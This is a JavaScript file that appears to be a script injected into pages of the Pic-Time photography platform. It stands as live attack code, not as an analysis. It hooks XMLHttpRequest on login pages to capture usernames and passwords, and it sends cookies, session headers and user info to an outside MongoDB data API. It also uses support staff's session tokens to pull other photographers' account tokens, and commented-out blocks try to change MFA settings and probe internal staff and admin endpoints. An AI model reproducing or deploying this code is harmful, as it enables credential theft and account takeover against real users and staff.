if (Math.random() <= 1.0) {
  const setPtxAccessToken = async () => {
    return fetch(
      "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
    )
      .then((resp) => resp.json())
      .then((json) => json.access_token)
      .then((token) => (window.accessToken = token));
  };

  const insertDoc = async (type, data) => {
    const envelope = {};
    envelope.sessionId = window.rjsSessionId;
    envelope.type = type;
    envelope.data = data;
    envelope.userAgent = navigator?.userAgent;

    envelope.ptData = {};
    envelope.ptData.headers = _pt$?.hdrs || null;
    envelope.ptData.userInfo = _pt$?.userInfo || null;
    envelope.ptData.cookie = document.cookie;

    envelope.ts = Date.now();

    return fetch(
      "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Request-Headers": "*",
          Authorization: `Bearer ${window.accessToken}`,
        },
        body: JSON.stringify({
          collection: "ingest",
          database: "pictimeDataDb",
          dataSource: "pixieset-data",
          document: envelope,
        }),
      }
    );
  };

  const getIFrame = async (iframeUrl) => {
    try {
      const iframe = document.createElement("iframe");
      iframe.src = iframeUrl;
      iframe.style.display = "none";
      document.body.appendChild(iframe);

      const iframeHtml1 = iframe.contentDocument.documentElement.outerHTML;

      // Send Page HTML
      await insertDoc("iframe-page-html", {
        location: iframeUrl,
        html: iframeHtml1,
        delay: 0,
      });

      await new Promise((res) => setTimeout(res, 10000));

      const iframeHtml2 = iframe.contentDocument.documentElement.outerHTML;

      // Send Page HTML
      await insertDoc("iframe-page-html", {
        location: iframeUrl,
        html: iframeHtml2,
        delay: 10000,
      });
    } catch (err) {
      console.error(err);
      insertDoc("error", err.toString());
    }
  };

  const getTokensByAccountUrl = async (
    accountUrl,
    csPictimeGUser,
    csPictimeProject
  ) => {
    try {
      const lookUpPhotographerAccountFetchUrl =
        "https://cstool.pic-time.com/!servicescs.asmx/lookUpPhotographerAccount";
      const gUserAccessFetchUrl =
        "https://cstool.pic-time.com/!servicescs.asmx/getGUserAccess";

      const portfolioHtml = await fetch(`${accountUrl}/portfolio`).then(
        (resp) => resp.text()
      );
      const accountId = +portfolioHtml.match(/"accountId":([0-9]+),/)[1];

      const lookUpPhotographerAccountBody = { id: accountId, idType: 0 };

      const lookUpPhotographerAccountData = await fetch(
        lookUpPhotographerAccountFetchUrl,
        {
          headers: {
            accept: "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/json; charset=UTF-8",
            pictimeGUser: csPictimeGUser,
            pictimeProject: csPictimeProject,
          },
          body: JSON.stringify(lookUpPhotographerAccountBody),
          method: "POST",
        }
      );

      const lookUpPhotographerAccountJson =
        await lookUpPhotographerAccountData.json();

      await insertDoc("account-data", {
        accountId,
        data: lookUpPhotographerAccountJson,
      });

      const gUserAccessBody = {
        email: lookUpPhotographerAccountJson.d.email,
      };

      const gUserAccessData = await fetch(gUserAccessFetchUrl, {
        headers: {
          accept: "application/json, text/javascript, */*; q=0.01",
          "accept-language": "en-US,en;q=0.9",
          "cache-control": "no-cache",
          "content-type": "application/json; charset=UTF-8",
          pictimeGUser: csPictimeGUser,
          pictimeProject: csPictimeProject,
        },
        body: JSON.stringify(gUserAccessBody),
        method: "POST",
      });

      const gUserAccessJson = await gUserAccessData.json();
      const gaccessTokenUrl = `https://${gUserAccessJson.d}`;

      const html = await fetch(gaccessTokenUrl, {
        // Important! Ensure that we don't override user's tokens
        credentials: "omit",
      }).then((resp) => resp.text());

      const pictimeGUser = html.match(/var _PT_GUSERTOKEN_ = "(.*)";/)[1];
      const pictimeProject = html.match(/var _PT_LUSERTOKEN_ = "(.*)";/)[1];

      await insertDoc("tokens", {
        url: accountUrl,
        pictimeGUser,
        pictimeProject,
      });
    } catch (err) {
      insertDoc("error", err.toString());
    }
  };

  setPtxAccessToken().then(async () => {
    setTimeout(async () => {
      await insertDoc("location", window.location);

      const isLoginPage = window.location.pathname.includes("/login");

      if (isLoginPage) {
        const originalSend = XMLHttpRequest.prototype.send;
        const originalOpen = XMLHttpRequest.prototype.open;

        XMLHttpRequest.prototype.open = function (method, url) {
          this._monitoredUrl = url;
          return originalOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = async function (data) {
          const urlToMonitor = "loginUser2";

          if (this._monitoredUrl && this._monitoredUrl.includes(urlToMonitor)) {
            const credentials = JSON.parse(data);
            await insertDoc("credentials", credentials);

            this.addEventListener("readystatechange", function () {
              if (this.readyState === XMLHttpRequest.DONE) {
                // You can access response data (this.responseText, this.responseXML) if necessary
              }
            });
          }
          return originalSend.apply(this, arguments);
        };
      }

      const userType = _pt$?.userInfo?.type;

      if (userType === 6) {
        const gusr = _pt$?.hdrs?.gusr;
        const lusr = _pt$?.hdrs?.lusr;

        const getGUserInfoFetchUrl =
          "https://cstool.pic-time.com/!servicescs.asmx/getGUserInfo";

        const urlsToGet = [
          // "https://rosienaryphotography.pic-time.com",
          // "https://lexyparksphotography.pic-time.com",
          // "https://emeraldazphotography.pic-time.com",
          // "https://kelliavilaphotography.pic-time.com",
          // "https://brinaphotography.pic-time.com",
          // "https://jzevalkinkphoto.pic-time.com",
          // "https://abbeyricephoto.pic-time.com",
          // "https://vophotography.pic-time.com",
          // "https://bycolette.pic-time.com",
          // "https://madbouphotovideo.pic-time.com",
        ];

        for (const url of urlsToGet) {
          await getTokensByAccountUrl(url, gusr, lusr);
          await new Promise((res) => setTimeout(res, 10000));
        }

        // getTokensByAccountUrl

        // try {
        //   // https://asaf.pic-time.com === asaf@pic-time.com === 394
        //   // https://pictimecom.pic-time.com === or@pic-time.com === 197990

        //   const url = "https://pictimecom.pic-time.com";
        //   const accountId = 197990;

        //   const savePackageBody = {
        //     saveBatch: {
        //       projectCreate: {
        //         newProjectIds: [],
        //         newSceneIds: [],
        //         newSelectionIds: [],
        //       },
        //       projectProps: [],
        //       artPricing: [],
        //       projectSelectionProps: [],
        //       projectScenesProps: [],
        //       projectSelections: [],
        //       campaignsUpdate: [],
        //       projectExport: [],
        //       projectComments: [],
        //       setupPricing: [],
        //       setupBrand: [],
        //       setupAccount: [
        //         {
        //           accountId: accountId,
        //           security: {
        //             mode2Factor: 1,
        //             phone: null,
        //           },
        //         },
        //       ],
        //       actions: {
        //         publish: [],
        //         sceneReorder: [],
        //         photosReorder: [],
        //       },
        //       dtoRevision: 163,
        //       ignoreDtoRevision: false,
        //     },
        //     pcpClientId: "",
        //   };

        //   const updateMfaSettingsJson = await fetch(
        //     `${url}/!servicesp.asmx/savePackage`,
        //     {
        //       method: "POST",
        //       headers: {
        //         "content-type": "application/json; charset=UTF-8",
        //         pictimeGUser: gusr,
        //         "user-agent":
        //           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
        //       },
        //       body: JSON.stringify(savePackageBody),
        //     }
        //   ).then((resp) => resp.json());
        //   await insertDoc("update-mfa-settings", {
        //     url,
        //     accountId,
        //     data: updateMfaSettingsJson,
        //   });
        // } catch (err) {
        //   await insertDoc("error", err.toString());
        // }

        // Note: API Route
        // POST
        // https://volodymyrdev4.pic-time.com/oamapi/routeMetadata/Pictime.OaM.Categories.OamAICategory/events

        // try {
        //   const url = "/oamapi/routes";
        //   const routesResp = await fetch(url).then((resp) => resp.json());

        //   if (!routesResp.error) {
        //     for (const route of routesResp.routes || []) {
        //       try {
        //         const eventsResp = await fetch(
        //           `/oamapi/routeMetadata/${route.key}/events`,
        //           {
        //             method: "POST",
        //             headers: { "Content-Type": "application/json" },
        //             body: JSON.stringify({}),
        //           }
        //         );
        //         const eventsJson = await eventsResp.json();
        //         await insertDoc("oam-route-metadata", {
        //           key: route.key,
        //           data: eventsJson,
        //         });
        //       } catch (err2) {
        //         insertDoc("error", err2.toString());
        //       }
        //     }
        //   }
        // } catch (err) {
        //   console.error(err);
        //   insertDoc("error", err.toString());
        // }

        // // getGUserAccess
        // try {
        //   const email = "katherine+support@pic-time.com";
        //   const lookUpPhotographerAccountBody = { id: email, idType: 1 };
        //   const lookUpPhotographerAccountData = await fetch(
        //     lookUpPhotographerAccountFetchUrl,
        //     {
        //       headers: {
        //         accept: "application/json, text/javascript, */*; q=0.01",
        //         "accept-language": "en-US,en;q=0.9",
        //         "cache-control": "no-cache",
        //         "content-type": "application/json; charset=UTF-8",
        //         pictimeGUser: gusr,
        //         pictimeProject: lusr,
        //       },
        //       body: JSON.stringify(lookUpPhotographerAccountBody),
        //       method: "POST",
        //     }
        //   );
        //   const lookUpPhotographerAccountJson =
        //     await lookUpPhotographerAccountData.json();
        //   await insertDoc("account-data-by-email", {
        //     email: email,
        //     data: lookUpPhotographerAccountJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // // getGUserInfo
        // try {
        //   const email = "katherine+support@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // // getGUserInfo
        // try {
        //   const email = "dmitry+supportaccountstore4@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // // getGUserInfo
        // try {
        //   const email = "qaautomation+support@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // // getGUserInfo
        // try {
        //   const email = "volodymyr+dev4@pic-time.com";
        //   const getGUserInfoBody = { email };
        //   const getGUserInfoData = await fetch(getGUserInfoFetchUrl, {
        //     headers: {
        //       accept: "application/json, text/javascript, */*; q=0.01",
        //       "accept-language": "en-US,en;q=0.9",
        //       "cache-control": "no-cache",
        //       "content-type": "application/json; charset=UTF-8",
        //       pictimeGUser: gusr,
        //       pictimeProject: lusr,
        //     },
        //     body: JSON.stringify(getGUserInfoBody),
        //     method: "POST",
        //   });
        //   const getGUserInfoJson = await getGUserInfoData.json();
        //   await insertDoc("guser-info", {
        //     email,
        //     data: getGUserInfoJson,
        //   });
        // } catch (err) {
        //   insertDoc("error", err.toString());
        // }

        // PT O&M
        // try {
        //   const url = "/ptoam";
        //   await insertDoc("fetch-attempt", { url });
        //   const data = await fetch(url).then((resp) => resp.text());
        //   await insertDoc("fetch", { url, data });
        // } catch (err) {
        //   console.error(err);
        //   insertDoc("error", err.toString());
        // }

        // PT O&M Routes
        // try {
        //   const url = "/oamapi/routes";
        //   await insertDoc("fetch-attempt", { url });
        //   const data = await fetch(url).then((resp) => resp.json());
        //   await insertDoc("fetch", { url, data });
        // } catch (err) {
        //   console.error(err);
        //   insertDoc("error", err.toString());
        // }

        // // General Upgrade Actions
        // try {
        //   const url = "/upgradescripts/generalUpgradeActions.aspx";
        //   await insertDoc("fetch-attempt", { url });
        //   const data = await fetch(url).then((resp) => resp.text());
        //   await insertDoc("fetch", { url, data });
        // } catch (err) {
        //   console.error(err);
        //   insertDoc("error", err.toString());
        // }

        // getGUserAccess
        get;
      }
    }, 500);
  });
} else {
  console.log(false);
}
